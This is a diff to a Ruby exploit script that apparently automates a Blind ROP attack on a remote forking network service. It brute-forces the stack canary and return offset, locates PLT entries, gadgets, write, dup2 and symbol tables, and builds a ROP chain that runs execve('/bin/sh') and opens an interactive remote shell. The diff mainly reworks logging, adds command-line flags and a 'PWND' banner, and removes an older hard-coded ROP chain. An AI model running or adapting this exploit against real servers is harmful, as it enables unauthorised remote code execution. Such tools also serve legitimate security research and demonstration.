@@ -20,6 +20,9 @@ require 'json'
 $ip = "127.0.0.1"
 $port = 80
 
+$verbose = false
+$prompt = false
+
 $vsyscall = 0xffffffffff600000
 $death = 0x41414141414141
 $text = 0x400000
@@ -159,6 +162,11 @@ VSYSCALL_OLD		= 1
 VSYSCALL_UNALIGNED	= 2
 VSYSCALL_NEW		= 3
 
+
+def print_info(s)
+	print(s) if $verbose
+end
+
 def grab_socket()
 	return TCPSocket.new($ip, $port) if not $sport
 
@@ -171,7 +179,7 @@ def grab_socket()
 		$localip = s.local_address.ip_address
 		s.close()
 
-		print("\nlocalip #{$localip}:#{$port}\n")
+		print_info("\nlocalip #{$localip}:#{$port}\n")
 	end
 
 	for i in 0..100
@@ -210,11 +218,11 @@ def get_child()
 				s = grab_socket()
 			end
 		rescue Timeout::Error
-			print("Connect timeout\n")
+			print_info("Connect timeout\n")
 			next
 		rescue SystemCallError => e
 			print("\nConnect exception, err=#{e}\n")
-			exit(666)
+			abort("Aborting")
 			next
 		end
 
@@ -308,7 +316,7 @@ def check_alive(s)
 			x = s.recv_nonblock(1)
 			return false if x.length == 0
 
-			print("\ncheck_alive yielded output length=#{x.length}: '#{x}'\n")
+			print_info("\ncheck_alive yielded output length=#{x.length}: '#{x}'\n")
 			return false
 		rescue Errno::EAGAIN
 			sleep(sl)
@@ -321,7 +329,7 @@ def check_alive(s)
 end
 
 def check_vuln()
-	print("Checking for vuln... ")
+	print("Checking whether target is vulnerable... ")
 
 	s = get_child()
 	send_initial(s)
@@ -356,12 +364,10 @@ def check_vuln()
 
 	print("Vulnerable\n")
 
-	print("Timeout is #{$state.time_out_val}\n")
+	print_info("Timeout is #{$state.time_out_val}\n")
 end
 
 def canary_detect(len)
-	print("Checking for canary... at #{len}\n")
-
 	canary = []
 
 	$sport = true
@@ -370,16 +376,18 @@ def canary_detect(len)
 		found = false
 
 		for i in 0..255
-			print("Testing #{i.to_s(16)}\r")
 
 			s = get_child()
 			send_initial(s)
 
 			data = "A" * len
 
+			print("Checking for canary at #{len}:  ")
 			for c in canary
+				print("#{c.to_s(16)} ")
 				data << [c].pack("C")
 			end
+			print("#{i.to_s(16)} \r")
 				
 			data << [i].pack("C")
 
@@ -390,14 +398,13 @@ def canary_detect(len)
 			s.close()
 
 			if rc == true
-				print("\nFound #{i.to_s(16)}\n")
 				canary << i
 				found = true
 				break
 			end
 		end
 
-		abort("Dang, canary not found!") if not found
+		abort("\nDang, canary not found!") if not found
 	end
 
 	val = 0
@@ -408,7 +415,7 @@ def canary_detect(len)
 	$state.canary = val
 	$state.canary_offset = len
 
-	print("Canary 0x#{$state.canary.to_s(16)} at #{$state.canary_offset}\n")
+	print("\nCanary 0x#{$state.canary.to_s(16)} at #{$state.canary_offset}\n")
 end
 
 def set_canary(data)
@@ -429,7 +436,7 @@ def check_overflow_len()
 	expected = 4192
 
 	while true
-		print("Check overflow len ... #{len}\r")
+		print("Finding overflow len ... #{len}\r")
 
 		s = get_child()
 		send_initial(s)
@@ -450,7 +457,7 @@ def check_overflow_len()
 	s.close()
 
 	if not $state.canary
-		print("Found overflow len #{len}\n")
+		print_info("Found overflow len #{len}\n")
 		canary_detect(len - 8)
 
 		print("Trying again with canary...\n")
@@ -515,7 +522,7 @@ def check_pad()
 		send_exp(s, rop)
 
 		alive = check_alive(s)
-		print("Trying pad #{pad}... alive = #{alive}\n")
+		print("Finding return address offset: #{pad}\r")
 
 		break if not alive
 
@@ -527,7 +534,7 @@ def check_pad()
 	$state.pad = pad
 	$state.depth -= pad
 
-	print("\nDepth #{$state.depth} pad #{$state.pad}\n")
+	print("\nDepth #{$state.depth}, return address offset #{$state.pad}\n")
 
 	s.close()
 end
@@ -572,12 +579,12 @@ def try_exp(rop)
 end
 
 def try_exp_print(addr, rop)
-	print("\rAddr 0x#{addr.to_s(16)} ... ")
+	print_info("\rAddr 0x#{addr.to_s(16)} ... ")
 
 	r = try_exp(rop)
 
-	print("ret\n") if (r == true)
-	print("infinite loop\n") if (r == 2)
+	print_info("ret\n") if (r == true)
+	print_info("infinite loop\n") if (r == 2)
 
 	return r
 end
@@ -1224,7 +1231,7 @@ end
 
 def find_plt(probe_depth = 0, start = $text, len = 0x1000)
 	plt  = start
-	plt += 0x5000  # dmccrady: cheat just to make it faster.
+	plt += 0x5100  # dmccrady: cheat just to make it faster.
 	plte = plt + len
 
 	while true
@@ -1246,7 +1253,9 @@ def find_plt(probe_depth = 0, start = $text, len = 0x1000)
 		plt += 0x10
 		# plt += 0x10 * 30
 
-		break if plt >= plte
+		if plt >= plte
+			abort("\nCould not find the PLT")
+		end
 	end
 end
 
@@ -1309,7 +1318,7 @@ def try_write3(write, fd, rep, sl)
 	end
 
 	if got_write(stuff)
-		printf("\nFound write at #{write} and fd #{fd}\n")
+		printf("\nFound write at PLT index #{write} using fd #{fd}\n")
 		$state.file_desc = fd
 		$state.write = write
 		return true
@@ -1440,107 +1449,6 @@ def print_progress()
 	$state.save()
 end
 
-def exp()
-	abort("Function exp() shouldn't be called")
-	print("Exploiting\n")
-
-	listeners = []
-
-	rop = []
-
-	fd = 15
-	rop << $state.rdi
-	rop << fd
-	rop << $state.rdi - 2
-	rop << 0
-	rop << 0
-	rop << 0x0000000000402810 # dup2
-
-	rop << $state.rdi
-	rop << fd
-	rop << $state.rdi - 2
-	rop << 1
-	rop << 0
-	rop << 0x0000000000402810 # dup2
-
-	rop << $state.rdi
-	rop << fd
-	rop << $state.rdi - 2
-	rop << 2
-	rop << 0
-	rop << 0x0000000000402810 # dup2
-
-	wr = 0x0068cf60
-	rop << $state.rdi - 2
-	rop << 0x0068732f6e69622f # /bin/sh
-	rop << 0
-
-	rax = 0x441b88
-	rop << rax
-	rop << wr
-	rop << 0x42a98b # mov rsi, (rax)
-
-	rdx = 0x404f4b
-	rop << rax
-	rop << wr + 0x7d
-	rop << rdx
-	rop << 0
-
-	rop << $state.rdi - 2
-	rop << 0
-	rop << 0
-
-	rop << $state.rdi
-	rop << wr
-
-	rop << 0x4029b0 # execve
-
-#	rop << 0xffffffffff600001
-	rop << 0x400000
-
-        s = get_child()
-
-	50.times do
-		listeners << get_child()
-	end
-
-        send_exp(s, rop)
-
-	for l in listeners
-		l.write("\n\n\n\n\n\n\nid\n")
-	end
-
-	x = ""
-	10.times do
-		for l in listeners
-			begin
-				x = l.recv_nonblock(1024)
-			rescue Errno::EAGAIN
-			end
-
-			if x.length > 0
-				s.close()
-				s = l
-				break
-			end
-		end
-
-		break if x.length > 0
-
-		sleep(0.1)
-	end
-
-	for l in listeners
-		l.close() if l != s
-	end
-
-	s.write("uname -a\nid\n")
-
-	dropshell(s)
-
-	exit(1)
-end
-
 def dropshell(s)
 	while true
 		r = select([s, STDIN], nil, nil)
@@ -1603,21 +1511,21 @@ def verify_gadget(gadget)
 	left  = get_dist(gadget, -1)
 	right = get_dist(gadget, 1)
 
-	print("Verifying gadget at #{gadget.to_s(16)}, left=#{left}, right=#{right}\n")
+	print_info("Verifying gadget at #{gadget.to_s(16)}, left=#{left}, right=#{right}\n")
 
 	rdi = gadget + right - 1
 
 	if left + right == 6      # 6 pops from the standard BROP gadget
 		return false if not check_multi_pop(rdi, 9, 6)
 		$state.rdi = rdi 
-		print("Found standard BROP gadget POP RDI at #{$state.rdi.to_s(16)}\n")
+		print("Found standard BROP gadget POP RDI at #{$state.rdi.to_s(16)} and POP RSI at #{($state.rdi-2).to_s(16)}\n")
 		$state.arg1_extra_pops = 0
 		$state.arg2_extra_pops = 1
 		success = true
 	elsif left + right == 7   # 7 pops from the stack-frame BROP gadget
 		return false if not check_multi_pop(rdi, 9, 6)
 		$state.rdi = rdi - 1  # Move back over the 'pop rbp' which is one byte into 'pop %r15' == 'pop %rdi'
-		print("Found stack frame BROP gadget POP RDI at #{$state.rdi.to_s(16)}\n")
+		print("Found stack frame BROP gadget POP RDI at #{$state.rdi.to_s(16)} and POP RSI at #{($state.rdi-2).to_s(16)}\n")
 		$state.arg1_extra_pops = 1
 		$state.arg2_extra_pops = 2
 		success = true
@@ -1625,7 +1533,7 @@ def verify_gadget(gadget)
 		success = false
 	end
 
-	print("LEFT #{left} RIGHT #{right} addr #{gadget.to_s(16)}\n") if success
+	print_info("LEFT #{left} RIGHT #{right} addr #{gadget.to_s(16)}\n") if success
 
 	return success
 end
@@ -1633,7 +1541,7 @@ end
 def find_gadget()
 	return if $state.rdi
 
-	print("Finding gadget\n")
+	print("Finding BROP gadget\n")
 
 	$start = $state.ret
 	$end = $state.ret + 0x100000
@@ -1657,7 +1565,7 @@ def find_gadget()
         r = try_exp_print(i, rop)
 		if r == true
 			if verify_gadget(i)
-				print("Found POP at 0x#{i.to_s(16)}\n")
+				print_info("Found POP at 0x#{i.to_s(16)}\n")
 				$state.pos = i
 				$state.pops << i
 				break
@@ -1706,11 +1614,11 @@ def test_strcmp(entry)
 end
 
 def find_rdx()
-	print("Finding strcmp using POP RDI at #{$state.rdi.to_s(16)} and POP RSI at #{($state.rdi-2).to_s(16)}\n")
+	print("\nFinding strcmp\n")
 
 	for i in 0..256
 		if test_strcmp(i)
-			print("\nFound strcmp at PLT #{i}\n")
+			print("\nFound strcmp at PLT index #{i}\n")
 			$state.strcmp = i
 			return
 		end
@@ -1723,7 +1631,7 @@ def find_dup2()
 	abort("write not found") if not $state.write
 	abort("fd not found") if not $state.file_desc
 
-	print("Find dup2\n")
+	print("\nFinding dup2\n")
 
 	target_fd = 100
 
@@ -1745,7 +1653,7 @@ def find_dup2()
 		s.close()
 
 		if got_write(x)
-			print("\nFound dup2 at #{i.to_s(16)}\n")
+			print("\nFound dup2 at PLT index #{i.to_s(16)}\n")
 			$state.dup2 = i
 			return 
 		end
@@ -1899,10 +1807,8 @@ def do_execve()
 	x = s.recv(1)
 
 	# While our ROP chain is executing a read, send it the "/bin/sh" string.
-	print("Sending '#{str}' to victim\n")
+	print("Victim is waiting 2 seconds to give us time to send '#{str}'... sending\n")
 	s.write(str)
-
-	print("Victim is waiting 2 secs...\n")
 
 	# Read back any output.  We should see "/bin/sh" in our output, which indicates
 	# that the write happened.
@@ -1924,7 +1830,7 @@ def do_execve()
 
 		stuff += x
 
-		print("do_execve received length  #{x.length}, stuff=#{stuff}\n")
+		print_info("do_execve received length  #{x.length}, stuff=#{stuff}\n")
 
 		got_good_stuff = stuff.include?(str) || stuff.include?("sh: turning off NDELAY mode")
 
@@ -1963,7 +1869,8 @@ def do_execve()
 		if x.include?("uid")
 			#print("\nFound execve at #{i.to_s(16)}\n")
 			#$state.execve = i  #DJM
-			print("\n\nPWWWNNND!\n\n")
+			#print("\n\nPWWWNNND!\n\n")
+			show_pwnage()
 			save_state()
 			print_progress()
 			s.write("uname -a\nid\n")
@@ -2042,16 +1949,16 @@ end
 def got_sym(symno, symname)
 	if symname == "read"
 		$state.read = symno
-		print("Read at #{$state.read}\n")
+		print_info("Read at #{$state.read}\n")
 	elsif symname == "execve"
 		$state.execve = symno
-		print("Execve at #{$state.execve}\n")
+		print_info("Execve at #{$state.execve}\n")
 	elsif symname == "usleep"
 		$state.usleep = symno
-		print("usleep at #{$state.usleep}\n")
+		print_info("usleep at #{$state.usleep}\n")
 	elsif symname == "dup2"
 		$state.dup2_sym_no = symno
-		print("dup2 at #{symno}\n")
+		print_info("dup2 at #{symno}\n")
 	end
 end
 
@@ -2065,22 +1972,24 @@ def switch_to_fn_symbols()
 	abort("dup2_sym_no not found") if not $state.dup2_sym_no
 
 	offset = $state.dup2 - $state.dup2_sym_no 
-	print("Adjusting PLT base by #{offset} entries... ")
+	if offset != 0
+		print("Adjusting PLT base by #{offset} entries... ")
 
-	$state.plt_base += offset * 0x10
-	print(" new PLT base at #{$state.plt_base.to_s(16)}\n")
+		$state.plt_base += offset * 0x10
+		print(" new PLT base at #{$state.plt_base.to_s(16)}\n")
 
-	# adjust the function indices of the PLT entries we found blind.
-	$state.strcmp -= offset
-	$state.dup2 -= offset
-	$state.write -= offset
+		# adjust the function indices of the PLT entries we found blind.
+		$state.strcmp -= offset
+		$state.dup2 -= offset
+		$state.write -= offset
 
-	print("New function indices:  strcmp=#{$state.strcmp}, dup2=#{$state.dup2}, write=#{$state.write}, read=#{$state.read}, execve=#{$state.execve}\n")
+		print("New function indices:  strcmp=#{$state.strcmp}, dup2=#{$state.dup2}, write=#{$state.write}, read=#{$state.read}, execve=#{$state.execve}\n")
+	end
 end
 
 
 def read_sym()
-	print("Reading sym\n")
+	print("Reading symbol information\n")
 
 	prog = ""
 	addr_start = 0x00400200 
@@ -2108,7 +2017,7 @@ def read_sym()
 					# XXX check 24 byte alignment
 
 					dynstr -= 1
-					print("dynstr at 0x#{dynstr.to_s(16)}\n")
+					print("Found dynstr at 0x#{dynstr.to_s(16)}\n")
 					break
 				end
 			end
@@ -2144,12 +2053,13 @@ def read_sym()
         	File.open("morte.bin", "w") { |file| file.write(prog) }
 	end
 
-	print("dynsym at 0x#{dynsym.to_s(16)}\n")
+	print("Found dynsym at 0x#{dynsym.to_s(16)}\n")
 
 	idx = dynsym - addr_start
 
-	print("Dumping symbols\n")
+	print("\nFinding more symbols\n")
 
+	writableSym = ""
 	symno = 0
 	symtab = {}
 	while idx < (dynstr - addr_start)
@@ -2167,7 +2077,7 @@ def read_sym()
 			need = dynstr + stri + 30
 
 			while addr < need
-				print("Reading #{addr.to_s(16)}\r")
+				print_info("Reading #{addr.to_s(16)}\r")
 				x = dump_addr(addr)
 				abort("dai") if x.length == 0
 
@@ -2186,9 +2096,9 @@ def read_sym()
 
 			symname = prog[strstart..strend]
 
-			print("Sym #{symno} #{type} #{symname}")
-			print(" #{val.to_s(16)}") if val != 0
-			print("\n")
+			print_info("\nSym #{symno} #{type} #{symname}")
+			print_info(" #{val.to_s(16)}") if val != 0
+			print_info("\n")
 
 			symtab[symno + 1] = symname
 			got_sym(symno, symname)
@@ -2201,14 +2111,23 @@ def read_sym()
 
 			if val > 0x500000
 				$state.writable = val
-				print("Setting writable to #{$state.writable.to_s(16)}, sym=#{symname}\n")
+				writableSym = symname
+				print_info("Setting writable to #{$state.writable.to_s(16)}, sym=#{symname}\n")
 			end
 		end
 
 		idx += symlen
 	end
 
+	print_info("\n")
+
 	read_rel(addr, symtab)
+
+	print("Found read() with index #{$state.read}\n")
+	print("Found usleep() with index #{$state.usleep}\n")
+	print("Found execve() with index #{$state.execve}\n")
+	print("Found dup2() with index #{$state.dup2_sym_no}\n")
+	print("Found writable location at #{$state.writable.to_s(16)} (sym=#{writableSym})\n")
 end
 
 def find_rel(prog)
@@ -2247,12 +2166,12 @@ end
 def read_rel(addr, symtab)
 	start = addr
 
-	print("Reading rel\n")
+	print("Reading rel section\n")
 	prog = ""
 	idx = 0
 
 	while true
-		print("Reading #{addr.to_s(16)}\r")
+		print_info("Reading #{addr.to_s(16)}\r")
 		x = dump_addr(addr)
 
 		abort("sdf") if x.length == 0
@@ -2269,7 +2188,7 @@ def read_rel(addr, symtab)
 
 	idx -= 8
 
-	print("Found REL at #{(idx + start).to_s(16)}\n")
+	print("Found REL section at #{(idx + start).to_s(16)}\n")
 
 	slot = 0
 
@@ -2296,10 +2215,10 @@ def read_rel(addr, symtab)
 
 		name = symtab[num]
 
-		print("Slot #{slot} num #{num} #{name}\n")
+		print_info("Slot #{slot} num #{num} #{name}\n")
 
 		if need.include?(name)
-			print("Found #{name} at #{slot}\n")
+			print_info("Found #{name} at #{slot}\n")
 			eval("$state.#{name} = #{slot}")
 			need.delete(name)
 
@@ -2354,23 +2273,51 @@ def clear_logs()
 	print("Cleared\n")
 end
 
+def show_pwnage()
+	print("\n\n")
+	print("######     #     #    #     #    ######     ## \n")
+	print("#     #    #  #  #    ##    #    #     #    ## \n")
+	print("#     #    #  #  #    # #   #    #     #    ## \n")
+	print("######     #  #  #    #  #  #    #     #    ## \n")
+	print("#          #  #  #    #   # #    #     #       \n")
+	print("#          #  #  #    #    ##    #     #    ## \n")
+	print("#           ## ##     #     #    ######     ## \n")
+	print("\n\n")
+end
+
+def intro(phase)
+	line = "-" * 70
+	print("\n")
+	print("#{line}\n")
+	print("#{phase}\n")
+	print("#{line}\n")
+
+	if $prompt
+		print("Hit enter to continue")
+		STDIN.gets()
+	end
+end
+
 def pwn()
 	print("Pwning\n")
-	print_progress()
+	print_progress()	# Always need to do this one at the start
 
 	check_vuln() if not $state.overflow_len
+
+	intro("Finding overflow length and canary")
 	check_overflow_len() if not $state.overflow_len
-	print_progress()
+	print_progress() if $verbose
 
 	$sport = true
 
+	intro("Finding PLT, stop gadget, and return address slot")
 	find_plt_depth() if not $state.plt
-	print_progress()
+	print_progress() if $verbose
 
 #	stack_read()
 
 	do_aslr() if not $state.plt
-	print_progress()
+	print_progress() if $verbose
 
 #	check_vsyscall() if not $vsyscall_mode
 #	determine_target()
@@ -2381,44 +2328,47 @@ def pwn()
 
 #	find_pops() if not $state.rax or not $state.syscall
 #	find_pops() if not $state.rdi
+	intro("Finding gadgets, including strcmp")
 	find_gadget() if not $state.rdi
-	print_progress()
+	print_progress() if $verbose
 
 	find_rdx() if not $state.strcmp
-	print_progress()
+	print_progress() if $verbose
 
+	intro("Finding write() with file descriptor, and dup2")
 #	find_write() if not $state.write
 #	find_write2() if not $state.write
 	find_write3() if not $state.write
-	print_progress()
+	print_progress() if $verbose
 #	find_rdi() if not $state.rdi
 #	find_rsi() if not $state.rsi
 
 #	find_fd()
 
 	find_dup2() if not $state.dup2
+	print_progress() if $verbose
 
-	print_progress()
-
+	intro("Dumping binary and reading symbols")
 	read_sym() if not $state.read
 
 	# Adjust function entries that we found blindly so they match the function symbol numbers
 	# in the symbol table.  This will adjust the PLT base.
 	switch_to_fn_symbols()
 
-	print_progress()
+	print_progress() if $verbose
 
 	find_good_rdx() if not $state.goodrdx
 
 #   dmccrady:  We already found execve by looking at the dynsym table.
 #	find_execve() if not $state.execve
 
+	intro("Final ROP attack")
 	do_execve()
 #	dump_bin()
 #	clear_logs()
 #	exp()
 
-	print_progress()
+	print_progress()	# Do this one even without verbose
 end
 
 def load_state()
@@ -2429,63 +2379,25 @@ def save_state(silent = false)
 	$state.save()
 end
 
-def test()
-	load_state()
-
-	$state.pad = 0
-	$state.depth = 0
-	$state.overflow_len = 4192
-
-	rop = Array.new(3, 0x400000)
-	try_exp(rop)
-
-# unlink changes rdx ; qsort interesting
-# strncmp
-
-	rop = []
-	r   = 0x402da1
-	plt = 0x402490
-
-	plt += 0x10 * 10
-
-	plt = 0x000000000402860
-
-	for i in 0..5
-		plt += 0x10 * i
-
-		print("Doing 0x#{plt.to_s(16)}\n")
-
-		rop << $state.rdi
-		rop << 0x400000
-
-		rop << $state.rdi - 2
-		rop << 0x400000
-		rop << 0
-
-		rop << plt
-		rop << r
-	end
-
-	rc = try_exp(rop)
-	print("RC IS #{rc}\n")
-
-	exit(1)
-end
-
 def main()
 #	test()
 
 	begin
 		load_state()
 
-		if ARGV.length > 1
-			exp()
-		elsif ARGV.length == 1
-			$ip = ARGV[0]
-			print("Pwning IP #{$ip}\n")
+		ARGV.each do |arg|
+			if arg == "-v"
+				$verbose = true
+			elsif arg == "-p"
+				$prompt = true
+			else
+				$ip = arg
+			end
 		end
+
 		pwn()
 		save_state()
+
 	rescue Interrupt => e
 		print("\nInterrupt\n")
 		puts e.backtrace
